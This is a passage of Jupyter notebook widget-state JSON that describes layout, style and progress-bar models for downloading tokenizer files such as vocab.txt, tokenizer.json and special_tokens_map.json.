            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "af09ce709c5c47f6a15cd53eeb6a7de9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "15db90b204814950994485569fbdf203": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6cd408dd55c2436e9612f7009831c1a7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "330aa617352f4e8484d0b4e7f75bc083": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_6bc311ea8b3c4c6eb5fc7a67747cc714",
              "IPY_MODEL_08cf0efa968044e4be99ff25dbf83c46",
              "IPY_MODEL_c0f28f0a6bc3453699ecea745e37b23b"
            ],
            "layout": "IPY_MODEL_9d401fc0d0e5486cb684f64a8e0962d7"
          }
        },
        "6bc311ea8b3c4c6eb5fc7a67747cc714": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_97fb9001570048949470e638a3662c6c",
            "placeholder": "​",
            "style": "IPY_MODEL_63969f19b005420abb1c4eb964e98201",
            "value": "vocab.txt: "
          }
        },
        "08cf0efa968044e4be99ff25dbf83c46": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_4bc21bee3e0d47228e8095e7228011cf",
            "max": 1,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_65c9d7f46bd743f7ab1e0e4e31a3ee81",
            "value": 1
          }
        },
        "c0f28f0a6bc3453699ecea745e37b23b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_27fed576764d4ad883c8c8a9e5ddf41f",
            "placeholder": "​",
            "style": "IPY_MODEL_5aad2a74979144219786adbd951027c2",
            "value": " 232k/? [00:00&lt;00:00, 8.84MB/s]"
          }
        },
        "9d401fc0d0e5486cb684f64a8e0962d7": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "97fb9001570048949470e638a3662c6c": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "63969f19b005420abb1c4eb964e98201": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "4bc21bee3e0d47228e8095e7228011cf": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": "20px"
          }
        },
        "65c9d7f46bd743f7ab1e0e4e31a3ee81": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "27fed576764d4ad883c8c8a9e5ddf41f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "5aad2a74979144219786adbd951027c2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "3fa25240bd10478fb0768ec2df95737a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_0e7a64c92aae43b883b81f0b5981846c",
              "IPY_MODEL_7c485999330448bb9d13c42196c140c1",
              "IPY_MODEL_d82eaf6b4c7948818a19d6d68e5bbbaa"
            ],
            "layout": "IPY_MODEL_e5c80a44b22c489e8682bb0ce51c1402"
          }
        },
        "0e7a64c92aae43b883b81f0b5981846c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_6183b080c53c45bbaf54503cd494953a",
            "placeholder": "​",
            "style": "IPY_MODEL_93107289abbf4c14a4daf20ee30921ca",
            "value": "tokenizer.json: "
          }
        },
        "7c485999330448bb9d13c42196c140c1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_61b0a18bb2a043c99c693d709503f5c6",
            "max": 1,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_6ef8ae4c8bca47009cfe31fea2f8be80",
            "value": 1
          }
        },
        "d82eaf6b4c7948818a19d6d68e5bbbaa": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_93482d976b0945fa88c254eccbcb8a03",
            "placeholder": "​",
            "style": "IPY_MODEL_c28f1f44bee246e9872c391faa14d6e7",
            "value": " 466k/? [00:00&lt;00:00, 6.52MB/s]"
          }
        },
        "e5c80a44b22c489e8682bb0ce51c1402": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6183b080c53c45bbaf54503cd494953a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "93107289abbf4c14a4daf20ee30921ca": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "61b0a18bb2a043c99c693d709503f5c6": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": "20px"
          }
        },
        "6ef8ae4c8bca47009cfe31fea2f8be80": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "93482d976b0945fa88c254eccbcb8a03": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "c28f1f44bee246e9872c391faa14d6e7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "bcf5b733e4b04a91bb4fe65b8c96b839": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_8586f08035bd44cd876514cc07bc6e3c",
              "IPY_MODEL_4d06d42f02d8464aadcc51d6cdd6be13",
              "IPY_MODEL_91d60e2723f44b45acdac236f1abbd83"
            ],
            "layout": "IPY_MODEL_3cabb288d46b4174baf3db7792e7f76a"
          }
        },
        "8586f08035bd44cd876514cc07bc6e3c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_418d18fe9f7f49139254444dc37fd628",
            "placeholder": "​",
            "style": "IPY_MODEL_3105ed28de19452db1ba55f01a93e192",
            "value": "special_tokens_map.json: 100%"
          }
        },
        "4d06d42f02d8464aadcc51d6cdd6be13": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_477f3a186e9b4af493d6361518f8d2b8",
            "max": 112,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_3394d63b5d3b4373baba337c10efc58e",
            "value": 112
          }
        },
        "91d60e2723f44b45acdac236f1abbd83": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_39f8a1b1b368443c886a071792a45b07",
            "placeholder": "​",
            "style": "IPY_MODEL_c9bd99d525fe4cc081a553d50311634f",
            "value": " 112/112 [00:00&lt;00:00, 10.5kB/s]"
          }
        },
        "3cabb288d46b4174baf3db7792e7f76a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "418d18fe9f7f49139254444dc37fd628": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "3105ed28de19452db1ba55f01a93e192": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "477f3a186e9b4af493d6361518f8d2b8": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "3394d63b5d3b4373baba337c10efc58e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "39f8a1b1b368443c886a071792a45b07": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "c9bd99d525fe4cc081a553d50311634f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "77839aea7ca342fb8ad13557081082b4": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_a158757c9e9b48eab395812cec93674c",
              "IPY_MODEL_efb08c7684024bb689645cd687e05285",
              "IPY_MODEL_7aafff94bcc24b86b1b59e94334e0c36"
            ],
            "layout": "IPY_MODEL_d2fea3348c6b44018f1f2492d2cbdcfd"
          }
        },
        "a158757c9e9b48eab395812cec93674c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_dc4f20d2da37465ab895f96d7332c364",
            "placeholder": "​",
